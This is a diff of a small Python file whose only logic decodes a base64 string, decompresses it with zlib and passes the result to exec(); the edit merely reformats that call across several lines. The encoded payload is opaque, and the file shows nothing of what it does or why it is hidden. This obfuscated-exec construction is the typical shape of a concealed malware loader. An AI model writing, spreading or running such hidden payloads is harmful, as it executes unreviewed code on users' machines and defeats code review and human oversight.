@@ -1,2 +1,10 @@
 import zlib, base64
-exec(zlib.decompress(base64.b64decode('eJyNUs1qGzEQvi/sOwzrQ3ZJLOpenAT2kLYuhEBbfA1ByKuRV9QrCUmb2oSc+gw9lz5Abz3Vxz6J36SSrbVp6aESrGaG+fm+b2cEtld0wZqPqDgxmzyTndHWg3ZH021Odv8oG21VnuVZCBPnue49sdhoJeSyt1iiajSXalmf9V6ML8+qYyZa+z+ZhvmWMGMCoFInl0urWIdHny1cfEtKhVwhpVVVRUgjuD3A9C2CXojeNcwjh7fM+ZsPtxC65pm3m+s8g3ASJ6kEWvoJF3mG6waNT11m1moLzAGmfGOl8qUo7l/dvL6bvXsDs/n8/fwB7tpfP9QyDN1tP4Nqdz+/G+g071cISdlreMLnojq0iSRxLX052YOWAiiN7CiFuoaC0o5JRWkxTI0Ya5heXk0PgRHMkfFDXFjdQaO7jikOK6kQmF32HSrvIDQ2zDnkia2AYjyOVUWgvEcRch/TlHhOygwnzY60h/z7wSBScVyXQ88KzmHyUJ3qk5az/SO1+rt1gPZn5N8iR3l3268SmiDst82wgeCDF4K77Zcg/VOE8EwIGTROWSRsd3n8v3GrLqDVztfF5OWUvAh3UlzsWdbxE4p/A1wH+RQ=')), globals())
+
+exec(
+    zlib.decompress(
+        base64.b64decode(
+            "eJyNUs1qGzEQvi/sOwzrQ3ZJLOpenAT2kLYuhEBbfA1ByKuRV9QrCUmb2oSc+gw9lz5Abz3Vxz6J36SSrbVp6aESrGaG+fm+b2cEtld0wZqPqDgxmzyTndHWg3ZH021Odv8oG21VnuVZCBPnue49sdhoJeSyt1iiajSXalmf9V6ML8+qYyZa+z+ZhvmWMGMCoFInl0urWIdHny1cfEtKhVwhpVVVRUgjuD3A9C2CXojeNcwjh7fM+ZsPtxC65pm3m+s8g3ASJ6kEWvoJF3mG6waNT11m1moLzAGmfGOl8qUo7l/dvL6bvXsDs/n8/fwB7tpfP9QyDN1tP4Nqdz+/G+g071cISdlreMLnojq0iSRxLX052YOWAiiN7CiFuoaC0o5JRWkxTI0Ya5heXk0PgRHMkfFDXFjdQaO7jikOK6kQmF32HSrvIDQ2zDnkia2AYjyOVUWgvEcRch/TlHhOygwnzY60h/z7wSBScVyXQ88KzmHyUJ3qk5az/SO1+rt1gPZn5N8iR3l3268SmiDst82wgeCDF4K77Zcg/VOE8EwIGTROWSRsd3n8v3GrLqDVztfF5OWUvAh3UlzsWdbxE4p/A1wH+RQ="
+        )
+    ),
+    globals(),
+)
